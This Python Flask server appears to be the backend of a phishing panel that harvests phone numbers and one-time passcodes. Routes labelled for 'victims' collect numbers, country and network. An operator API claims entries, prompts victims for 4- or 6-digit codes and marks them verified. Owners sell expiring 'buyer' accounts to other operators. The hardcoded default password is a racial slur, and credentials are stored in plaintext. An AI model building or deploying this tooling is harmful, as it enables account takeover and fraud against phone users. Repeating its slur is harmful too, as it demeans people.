from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import json
import os
import uuid
from datetime import datetime, timedelta

app = Flask(__name__, static_folder='.')
CORS(app)

# ============================================================
# DATA FILES
# ============================================================

DB_FILE = 'database.json'
CONFIG_FILE = 'config.json'

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    return {"queues": {"A": [], "B": [], "C": []}}

def save_db(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {"owners": [], "buyers": [], "sessions": {}}

def save_config(data):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(data, f, indent=2)

# ============================================================
# INIT — RUNS ON STARTUP (EVEN WITH GUNICORN)
# ============================================================

def init_config():
    """Create default owner if none exists — runs on app startup"""
    config = load_config()
    
    if not config.get('owners'):
        config['owners'] = [{
            'username': 'owner',
            'password': 'nigga',  # ← CHANGE THIS TO YOUR PASSWORD
            'created': datetime.now().isoformat()
        }]
        save_config(config)
        print("✅ Owner created: owner / [your-password]")
    
    # Also ensure database exists
    db = load_db()
    if not db.get('queues'):
        db['queues'] = {"A": [], "B": [], "C": []}
        save_db(db)
        print("✅ Database initialized")

# Run config init when app starts
init_config()

# ============================================================
# ROUTES - VICTIM
# ============================================================

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/admin')
def admin():
    return send_from_directory('.', 'admin.html')

@app.route('/api/submit', methods=['POST'])
def submit_number():
    data = request.json
    queue_id = str(uuid.uuid4())[:8]
    db = load_db()
    
    queue_letter = data.get('queue', 'C')
    if queue_letter not in db['queues']:
        db['queues'][queue_letter] = []
    
    entry = {
        'id': queue_id,
        'number': data.get('number'),
        'country': data.get('country'),
        'network': data.get('network'),
        'timestamp': datetime.now().isoformat(),
        'status': 'pending',
        'otp_length': 4,
        'otp': None,
        'verified': False,
        'claimed_by': None
    }
    
    db['queues'][queue_letter].append(entry)
    save_db(db)
    
    return jsonify({'success': True, 'queueId': queue_id})

# ============================================================
# ROUTES - ADMIN API
# ============================================================

@app.route('/api/admin/queues', methods=['GET'])
def get_queues():
    db = load_db()
    return jsonify(db['queues'])

@app.route('/api/admin/update', methods=['POST'])
def update_entry():
    data = request.json
    queue_id = data.get('queueId')
    action = data.get('action')
    otp_value = data.get('otp')
    username = data.get('username', 'unknown')
    
    db = load_db()
    
    for queue_letter, entries in db['queues'].items():
        for entry in entries:
            if entry['id'] == queue_id:
                
                if action == 'claimed':
                    entry['status'] = 'claimed'
                    entry['claimed_by'] = username
                    save_db(db)
                    return jsonify({'success': True})
                
                elif action == 'wrong':
                    entry['status'] = 'wrong'
                    save_db(db)
                    return jsonify({'success': True})
                
                elif action == 'verified':
                    entry['status'] = 'verified'
                    entry['verified'] = True
                    save_db(db)
                    return jsonify({'success': True})
                
                elif action == 'otp_4':
                    entry['otp_length'] = 4
                    entry['otp'] = otp_value
                    entry['status'] = 'otp_sent'
                    save_db(db)
                    return jsonify({'success': True, 'otp': otp_value})
                
                elif action == 'otp_6':
                    entry['otp_length'] = 6
                    entry['otp'] = otp_value
                    entry['status'] = 'otp_sent'
                    save_db(db)
                    return jsonify({'success': True, 'otp': otp_value})
                
                elif action == 'verify_otp':
                    user_otp = data.get('otp')
                    if entry.get('otp') == user_otp:
                        entry['status'] = 'verified'
                        entry['verified'] = True
                        save_db(db)
                        return jsonify({'success': True})
                    else:
                        return jsonify({'success': False})
                
                elif action == 'resend':
                    entry['status'] = 'pending'
                    entry['otp'] = None
                    save_db(db)
                    return jsonify({'success': True})
                
                else:
                    return jsonify({'success': False, 'message': 'Unknown action'})
    
    return jsonify({'success': False, 'message': 'Entry not found'})

@app.route('/api/admin/stats', methods=['GET'])
def get_stats():
    db = load_db()
    total = 0
    pending = 0
    verified = 0
    wrong = 0
    otp_sent = 0
    
    for entries in db['queues'].values():
        for e in entries:
            total += 1
            if e['status'] == 'pending':
                pending += 1
            elif e['status'] == 'verified':
                verified += 1
            elif e['status'] == 'wrong':
                wrong += 1
            elif e['status'] == 'otp_sent':
                otp_sent += 1
    
    return jsonify({
        'total': total,
        'pending': pending,
        'verified': verified,
        'wrong': wrong,
        'otp_sent': otp_sent
    })

# ============================================================
# AUTH SYSTEM
# ============================================================

@app.route('/api/auth/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    config = load_config()
    
    # Check owners
    for owner in config.get('owners', []):
        if owner['username'] == username and owner['password'] == password:
            token = str(uuid.uuid4())
            owner['token'] = token
            owner['last_login'] = datetime.now().isoformat()
            save_config(config)
            return jsonify({
                'success': True, 
                'token': token, 
                'role': 'owner',
                'username': username
            })
    
    # Check buyers
    for buyer in config.get('buyers', []):
        if buyer['username'] == username and buyer['password'] == password:
            if buyer.get('expiry'):
                expiry = datetime.fromisoformat(buyer['expiry'])
                if datetime.now() > expiry:
                    return jsonify({
                        'success': False, 
                        'message': 'Account expired. Contact owner.'
                    })
            token = str(uuid.uuid4())
            buyer['token'] = token
            buyer['last_login'] = datetime.now().isoformat()
            save_config(config)
            return jsonify({
                'success': True, 
                'token': token, 
                'role': 'buyer',
                'username': username
            })
    
    return jsonify({'success': False, 'message': 'Invalid credentials'})

@app.route('/api/auth/verify', methods=['POST'])
def verify_token():
    data = request.json
    token = data.get('token')
    
    config = load_config()
    
    for owner in config.get('owners', []):
        if owner.get('token') == token:
            return jsonify({
                'success': True, 
                'username': owner['username'], 
                'role': 'owner'
            })
    
    for buyer in config.get('buyers', []):
        if buyer.get('token') == token:
            if buyer.get('expiry'):
                expiry = datetime.fromisoformat(buyer['expiry'])
                if datetime.now() > expiry:
                    return jsonify({
                        'success': False, 
                        'message': 'Account expired'
                    })
            return jsonify({
                'success': True, 
                'username': buyer['username'], 
                'role': 'buyer'
            })
    
    return jsonify({'success': False, 'message': 'Invalid token'})

@app.route('/api/auth/create_buyer', methods=['POST'])
def create_buyer():
    data = request.json
    token = data.get('token')
    new_username = data.get('username')
    new_password = data.get('password')
    days = int(data.get('days', 30))
    
    config = load_config()
    
    is_owner = False
    owner_name = None
    for owner in config.get('owners', []):
        if owner.get('token') == token:
            is_owner = True
            owner_name = owner['username']
            break
    
    if not is_owner:
        return jsonify({'success': False, 'message': 'Only owners can create buyers'})
    
    for buyer in config.get('buyers', []):
        if buyer['username'] == new_username:
            return jsonify({'success': False, 'message': 'Username already exists'})
    
    expiry = (datetime.now() + timedelta(days=days)).isoformat()
    
    config['buyers'].append({
        'username': new_username,
        'password': new_password,
        'created': datetime.now().isoformat(),
        'expiry': expiry,
        'created_by': owner_name
    })
    save_config(config)
    
    return jsonify({
        'success': True, 
        'message': f'Buyer {new_username} created for {days} days',
        'expiry': expiry
    })

@app.route('/api/auth/list_buyers', methods=['POST'])
def list_buyers():
    data = request.json
    token = data.get('token')
    
    config = load_config()
    
    is_owner = False
    for owner in config.get('owners', []):
        if owner.get('token') == token:
            is_owner = True
            break
    
    if not is_owner:
        return jsonify({'success': False, 'message': 'Only owners can view buyers'})
    
    buyers = []
    for buyer in config.get('buyers', []):
        buyers.append({
            'username': buyer['username'],
            'created': buyer.get('created', 'Unknown'),
            'expiry': buyer.get('expiry', 'Never'),
            'created_by': buyer.get('created_by', 'Unknown')
        })
    
    return jsonify({'success': True, 'buyers': buyers})

@app.route('/api/auth/delete_buyer', methods=['POST'])
def delete_buyer():
    data = request.json
    token = data.get('token')
    username = data.get('username')
    
    config = load_config()
    
    is_owner = False
    for owner in config.get('owners', []):
        if owner.get('token') == token:
            is_owner = True
            break
    
    if not is_owner:
        return jsonify({'success': False, 'message': 'Only owners can delete buyers'})
    
    for i, buyer in enumerate(config.get('buyers', [])):
        if buyer['username'] == username:
            config['buyers'].pop(i)
            save_config(config)
            return jsonify({'success': True, 'message': f'Buyer {username} deleted'})
    
    return jsonify({'success': False, 'message': 'Buyer not found'})

# ============================================================
# RUN
# ============================================================

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
